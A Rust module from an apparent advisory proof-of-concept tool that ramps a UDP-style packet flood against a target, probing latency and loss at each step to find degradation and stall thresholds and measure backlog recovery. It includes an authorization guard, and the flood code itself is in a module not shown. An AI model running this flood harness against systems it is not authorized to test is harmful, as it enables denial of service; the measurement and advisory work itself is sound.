//! harness (advisory §9): ramp the flood, run the probe per step, emit a
//! dose–response table, then measure post-attack recovery (backlog drain, §5.3).

use crate::attack::{self, FloodStats};
use crate::cli::{AttackArgs, GlobalGuards, HarnessArgs, SprayMode};
use crate::guard;
use crate::probe::{self, ProbeStats};
use serde::Serialize;
use std::io;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// Wire size assumed for attacker packets when reporting bandwidth (advisory §10.1).
const TRIGGER_WIRE_BYTES: u64 = 45;

#[derive(Debug, Serialize)]
pub struct StepResult {
    pub step_pps: u64,
    pub attacker_achieved_pps: f64,
    pub attacker_bandwidth_kbps: f64,
    pub probe: ProbeStats,
}

#[derive(Debug, Serialize)]
pub struct HarnessReport {
    pub target: String,
    pub mode: String,
    pub probe_pps: u64,
    pub dwell_secs: u64,
    pub baseline: ProbeStats,
    pub steps: Vec<StepResult>,
    pub recovery: ProbeStats,
    pub t_degrade_pps: Option<u64>,
    pub t_stall_pps: Option<u64>,
}

pub fn run(args: HarnessArgs, guards: &GlobalGuards) -> io::Result<()> {
    probe::validate_payload_len(args.probe_payload_len)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    attack::validate_payload_len(args.attack_payload_len)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;

    let steps = parse_steps(&args.steps)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    let max_step = steps.iter().copied().max().unwrap_or(0);

    // Authorize once against the most demanding step (kill switch, §12).
    guard::authorize(guards, max_step, args.dwell_secs)
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    let dwell = Duration::from_secs(args.dwell_secs);
    let stop = Arc::new(AtomicBool::new(false));

    eprintln!(
        "[harness] target={} mode={:?} steps={:?} dwell={}s probe_pps={}",
        args.target, args.mode, steps, args.dwell_secs, args.probe_pps
    );

    // ---- baseline (no flood) ----
    eprintln!("[harness] baseline (probe only)...");
    let baseline = probe::run_probe(
        args.target,
        "0.0.0.0:0".parse().unwrap(),
        args.probe_pps,
        args.probe_payload_len,
        dwell,
        Arc::clone(&stop),
    )?;
    log_probe("baseline", 0, &baseline);

    // ---- ramp ----
    let mut results: Vec<StepResult> = Vec::new();
    for &pps in &steps {
        if stop.load(Ordering::Relaxed) {
            break;
        }
        if pps == 0 {
            // treat explicit 0 as an extra baseline sample
            let p = probe::run_probe(
                args.target,
                "0.0.0.0:0".parse().unwrap(),
                args.probe_pps,
                args.probe_payload_len,
                dwell,
                Arc::clone(&stop),
            )?;
            log_probe("step", 0, &p);
            results.push(StepResult {
                step_pps: 0,
                attacker_achieved_pps: 0.0,
                attacker_bandwidth_kbps: 0.0,
                probe: p,
            });
            continue;
        }

        eprintln!("[harness] step {pps} pps: flood + probe for {}s", args.dwell_secs);
        let flood_stop = Arc::new(AtomicBool::new(false));
        let flood_args = build_attack_args(&args, pps);
        let g = guards.clone();
        let fs = Arc::clone(&flood_stop);
        let flood_handle = std::thread::spawn(move || attack::run_flood(&flood_args, &g, fs));

        let p = probe::run_probe(
            args.target,
            "0.0.0.0:0".parse().unwrap(),
            args.probe_pps,
            args.probe_payload_len,
            dwell,
            Arc::clone(&stop),
        )?;

        flood_stop.store(true, Ordering::SeqCst);
        let flood: FloodStats = flood_handle
            .join()
            .map_err(|_| io::Error::new(io::ErrorKind::Other, "flood thread panicked"))??;

        let bw = flood.achieved_pps * TRIGGER_WIRE_BYTES as f64 * 8.0 / 1000.0;
        log_probe("step", pps, &p);
        eprintln!(
            "           attacker achieved {:.0} pps (~{:.1} kbps)",
            flood.achieved_pps, bw
        );
        results.push(StepResult {
            step_pps: pps,
            attacker_achieved_pps: flood.achieved_pps,
            attacker_bandwidth_kbps: bw,
            probe: p,
        });
    }

    // ---- recovery (probe only; measures 32 MB backlog drain, §5.3) ----
    eprintln!("[harness] recovery: probe only for {}s (backlog drain)...", args.recovery_secs);
    let recovery = probe::run_probe(
        args.target,
        "0.0.0.0:0".parse().unwrap(),
        args.probe_pps,
        args.probe_payload_len,
        Duration::from_secs(args.recovery_secs),
        Arc::clone(&stop),
    )?;
    log_probe("recovery", 0, &recovery);

    // ---- thresholds (§9.4) ----
    let t_degrade = results
        .iter()
        .find(|r| {
            r.step_pps > 0
                && (r.probe.rtt_p99_us as f64 > 2.0 * baseline.rtt_p99_us.max(1) as f64
                    || r.probe.loss_pct > 1.0)
        })
        .map(|r| r.step_pps);
    let t_stall = results
        .iter()
        .find(|r| r.step_pps > 0 && r.probe.loss_pct > 50.0)
        .map(|r| r.step_pps);

    let report = HarnessReport {
        target: args.target.to_string(),
        mode: format!("{:?}", args.mode),
        probe_pps: args.probe_pps,
        dwell_secs: args.dwell_secs,
        baseline,
        steps: results,
        recovery,
        t_degrade_pps: t_degrade,
        t_stall_pps: t_stall,
    };

    print_csv(&report);
    eprintln!(
        "[harness] T_degrade={:?} pps  T_stall={:?} pps",
        report.t_degrade_pps, report.t_stall_pps
    );

    if let Some(path) = &args.out {
        std::fs::write(path, serde_json::to_string_pretty(&report).unwrap())?;
        eprintln!("[harness] wrote JSON report -> {path}");
    }
    Ok(())
}

fn build_attack_args(h: &HarnessArgs, pps: u64) -> AttackArgs {
    AttackArgs {
        target: h.target,
        pps,
        secs: h.dwell_secs + 1, // slightly outlast the probe window
        payload_len: h.attack_payload_len,
        mode: h.mode,
        port_pool: match h.mode {
            SprayMode::Spray => 256,
            SprayMode::Single => 1,
        },
        src_port: 0,
        workers: 0,
    }
}

fn parse_steps(s: &str) -> Result<Vec<u64>, String> {
    s.split(',')
        .map(|t| t.trim())
        .filter(|t| !t.is_empty())
        .map(|t| t.parse::<u64>().map_err(|_| format!("invalid step '{t}'")))
        .collect()
}

fn log_probe(kind: &str, pps: u64, p: &ProbeStats) {
    eprintln!(
        "  [{kind:>8} @ {pps:>6} pps] sent={} recv={} loss={:.2}% p50={}us p99={}us p999={}us",
        p.sent, p.received, p.loss_pct, p.rtt_p50_us, p.rtt_p99_us, p.rtt_p999_us
    );
}

fn print_csv(r: &HarnessReport) {
    println!("attacker_pps,attacker_bandwidth_kbps,probe_rtt_p50_us,probe_rtt_p99_us,probe_rtt_p999_us,probe_loss_pct");
    let base = &r.baseline;
    println!(
        "baseline,0.0,{},{},{},{:.3}",
        base.rtt_p50_us, base.rtt_p99_us, base.rtt_p999_us, base.loss_pct
    );
    for s in &r.steps {
        println!(
            "{},{:.1},{},{},{},{:.3}",
            s.step_pps,
            s.attacker_bandwidth_kbps,
            s.probe.rtt_p50_us,
            s.probe.rtt_p99_us,
            s.probe.rtt_p999_us,
            s.probe.loss_pct
        );
    }
    println!(
        "recovery,0.0,{},{},{},{:.3}",
        r.recovery.rtt_p50_us, r.recovery.rtt_p99_us, r.recovery.rtt_p999_us, r.recovery.loss_pct
    );
}
